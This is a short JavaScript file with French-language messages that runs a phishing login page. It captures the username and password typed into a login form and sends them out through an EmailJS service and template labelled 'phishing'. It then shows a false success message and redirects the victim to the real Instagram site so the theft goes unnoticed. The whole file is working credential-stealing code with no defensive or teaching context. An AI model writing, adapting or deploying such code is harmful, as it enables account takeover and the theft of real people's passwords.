document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    document.getElementById('loginMessage').textContent = "Connexion en cours...";

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    emailjs.send('service_phishing', 'template_phishing', {
        username: username,
        password: password,
    }).then(function(response) {
        console.log('SUCCESS!', response.status, response.text);
        document.getElementById('loginMessage').textContent = "Connexion réussie!";
        
        // Redirection vers Instagram après un délai de 2 secondes
        setTimeout(function() {
            window.location.href = 'https://www.instagram.com';
        }, 2000); 
    }, function(error) {
        console.log('FAILED...', error);
        document.getElementById('loginMessage').textContent = "Échec de la connexion.";
    });
});
